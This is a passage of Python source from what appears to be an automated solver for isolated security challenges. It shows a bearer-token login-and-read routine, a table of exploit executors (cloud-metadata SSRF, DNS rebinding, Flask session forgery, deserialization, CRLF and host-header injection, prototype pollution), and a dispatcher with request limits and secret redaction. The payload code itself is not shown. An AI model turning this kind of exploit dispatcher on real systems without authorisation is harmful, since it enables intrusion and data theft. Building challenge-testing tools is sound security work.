    isolated = _alias(contract, ("isolated_instance", "synthetic_account"), bool)
    read_only = _alias(contract, ("read_only", "side_effect_free"), bool)
    auth_mode = _alias(contract, ("authentication_mode", "auth_mode"), str)
    scheme = _alias(contract, ("authorization_scheme", "auth_scheme"), str)
    token_profile = _alias(contract, ("token_profile", "bearer_profile"), str)
    token_path = _alias(contract, ("token_path", "bearer_token_path"), list)
    login_effect = _alias(contract, ("login_effect", "session_effect"), str)
    read_effect = _alias(contract, ("read_effect", "proof_effect"), str)
    fields = (raw_login, raw_read, method, transport, user_field, pass_field,
              username, password, scope, isolated, read_only, auth_mode,
              scheme, token_profile, token_path, login_effect, read_effect)
    if any(value in (_MISSING, _AMBIGUOUS) for value in fields):
        return None
    login_route = _safe_route(raw_login, base_url)
    read_route = _safe_route(raw_read, base_url)
    printable = lambda value: (1 <= len(value) <= 256
                               and all(0x20 <= ord(char) <= 0x7e for char in value)
                               and not any(char in value for char in "\r\n\x00"))
    if (login_route is None or read_route is None or str(method).upper() != "POST"
            or _canonical(transport) != "json" or _field(user_field) is None
            or _field(pass_field) is None or not printable(username) or not printable(password)
            or _canonical(scope) != "challenge_synthetic" or isolated is not True
            or read_only is not True or _canonical(auth_mode) != "json_bearer"
            or _canonical(scheme) != "bearer"
            or _canonical(token_profile) != "target_issued_bearer"
            or not isinstance(login_effect, str) or not SAFE_VALUE.fullmatch(login_effect)
            or not isinstance(read_effect, str) or not SAFE_VALUE.fullmatch(read_effect)
            or _nested_json_value({}, token_path) not in (_MISSING,)
            or _canonical(token_path[-1]) not in ("access_token", "bearer_token", "token")
            or not _can_send(ctx, state, reserve=4)):
        return None
    token = None

    def exact_effect(response, expected):
        document = _json_doc(response)
        return (document if isinstance(document, dict) and document.get("ok") is True
                and document.get("effect") == expected else None)

    try:
        before = _send_exact(ctx, state, "GET", read_route)
        try:
            if before is None or int(before.get("status")) not in (401, 403):
                return None
        except (TypeError, ValueError, OverflowError):
            return None
        _control_baseline(before, baselines)
        values = {user_field: username, pass_field: password}
        body = json.dumps(values, separators=(",", ":"), ensure_ascii=True)
        login = _send_exact(ctx, state, "POST", login_route, data=body,
                            headers={"Content-Type": "application/json"}, terminal=True)
        try:
            if login is None or not 200 <= int(login.get("status")) < 300:
                return None
        except (TypeError, ValueError, OverflowError):
            return None
        login_doc = exact_effect(login, login_effect)
        if login_doc is None:
            return None
        token = _nested_json_value(login_doc, token_path)
        if (not isinstance(token, str) or not BEARER_TOKEN.fullmatch(token)
                or not _can_send(ctx, state, reserve=2)):
            return None
        _control_baseline(login, baselines)

        # Login may have set or rebound cookies.  A second plain GET must
        # remain denied before the bearer value has any authority.
        after_login = _send_exact(ctx, state, "GET", read_route, terminal=True)
        try:
            if after_login is None or int(after_login.get("status")) not in (401, 403):
                return None
        except (TypeError, ValueError, OverflowError):
            return None
        _control_baseline(after_login, baselines)
        if not _can_send(ctx, state):
            return None
        response = _send_exact(
            ctx, state, "GET", read_route,
            headers={"Authorization": "Bearer " + token}, terminal=True)
        if exact_effect(response, read_effect) is None:
            return None
        return _proof(response, baselines, _origin_host(base_url), state)
    finally:
        redact = getattr(ctx.get("client"), "redact_log", None)
        if callable(redact):
            try:
                redact((username, password, token), clear_cookies=True)
            except Exception:
                pass


_EXECUTORS = (
    ("imdsv2_ssrf", "cloud_metadata", _imdsv2),
    ("open_redirect_ssrf", "open_redirect", _redirect_chain),
    ("dns_rebind_ssrf", "dns_rebind", _dns_rebind),
    ("flask_signed_session", "flask_werkzeug", _flask_session),
    ("deserialization_inert", "deserialization", _deserialization_inert),
    ("crlf_response_canary", "crlf_response_split", _crlf_canary),
    ("host_header_canary", "host_header", _host_header_canary),
    ("boolean_read_injection", "ldap_xpath_injection", _boolean_read_injection),
    ("json_rpc_read", "json_rpc", _json_rpc_read),
    ("soap_read", "soap_wsdl", _soap_read),
    ("grpc_web_read", "grpc_web", _grpc_web_read),
    ("readable_upload_canary", "upload_canary", _upload_canary),
    ("json_body_read", "api_json_read", _json_body_read),
    ("synthetic_credential_read", "synthetic_credential", _synthetic_credential_read),
    ("synthetic_bearer_read", "synthetic_bearer", _synthetic_bearer_read),
    # The sole process-global mutation is last and requires its own negative
    # control, isolated-instance assertion and structural readback.
    ("prototype_pollution_canary", "prototype_pollution", _prototype_canary),
)


def solve(target, ctx=None):
    """Try exact advanced contracts and return one proven target value.

    ``preloaded`` is the only authority source.  With no unique valid contract
    the function performs zero wire requests.  Metadata written to
    ``result_sink`` never includes a cookie, signing key, IMDS token, URL
    parameter value, serialized blob, or response body.
    """
    target = dict(target or {})
    ctx = dict(ctx or {})
    answer_id = str(target.get("answer_id") or "target")
    sink = ctx.get("result_sink") if isinstance(ctx.get("result_sink"), dict) else {}
    state = {"requests": 0, "posts": 0, "terminal": False,
             "candidates": [], "baseline_incomplete": False}
    summary = {
        "requests": 0, "posts": 0, "success": False, "terminal": False,
        "class": None, "contracts": [], "ambiguous": [], "candidates": [],
        "baseline_incomplete": False,
    }
    sink[answer_id] = summary
    base_url = str(target.get("url") or "")
    if (_proofs is None or _classes is None or not base_url
            or ctx.get("client") is None or not callable(ctx.get("route_allowed"))):
        return None
    cache = _cache(ctx, base_url)
    contracts, ambiguous = _contracts(cache)
    summary["contracts"] = [kind for kind, _name, _fn in _EXECUTORS if kind in contracts]
    summary["ambiguous"] = sorted(ambiguous)
    baselines = _baseline_set(ctx, cache)
    evidence = ctx.get("evidence")

    # The recon router's target-byte ranking decides which complete advanced
    # contract gets the first chance.  A missing/malformed plan retains the
    # conservative fixed order; it never creates authority for a contract.
    class_ranks = {}
    for row in list(ctx.get("dispatch_plan") or [])[:32]:
        if not isinstance(row, dict) or row.get("phase") != "peer:recon-advanced":
            continue
        try:
            class_ranks[str(row.get("class") or "")] = int(row.get("rank"))
        except (TypeError, ValueError, OverflowError):
            continue
    executors = list(enumerate(_EXECUTORS))
    executors.sort(key=lambda item: (class_ranks.get(item[1][1], 10_000), item[0]))

    for _fixed_index, (kind, class_name, executor) in executors:
        row = contracts.get(kind)
        if row is None or not _can_send(ctx, state):
            continue
        contract, _source_route = row
        before = state["requests"]
        posts_before = state["posts"]
        terminal_before = state["terminal"]
        value = executor(target, ctx, state, contract, list(baselines))
        began_post = state["posts"] > posts_before
        became_terminal = state["terminal"] and not terminal_before
        summary.update(requests=state["requests"], posts=state["posts"],
                       terminal=bool(state["terminal"] or state["posts"] > 0),
                       candidates=list(state["candidates"]),
                       baseline_incomplete=bool(state["baseline_incomplete"]),
                       **{"class": class_name})
        if isinstance(evidence, list):
            evidence.append({"class": class_name, "confirmed": bool(value),
                             "requests": state["requests"] - before,
                             "note": "exact target-described advanced contract"})
        if value:
            summary["success"] = True
            return value
        # A POST-backed protocol may have minted a token, invoked a parser or
        # changed per-instance state even when its response was ambiguous.
        # Never reinterpret the same controls as another exploit class after
        # that boundary.  proof_hunt integrates this peer as stateful and uses
        # the same `terminal`/`posts` metadata to stop its broader fallthrough.
        if began_post or became_terminal:
            summary["stopped"] = "terminal_post" if began_post else "terminal_protocol"
            return None
    summary.update(requests=state["requests"], posts=state["posts"])
    return None


__all__ = ["SUPPORTED_CONTRACTS", "solve"]
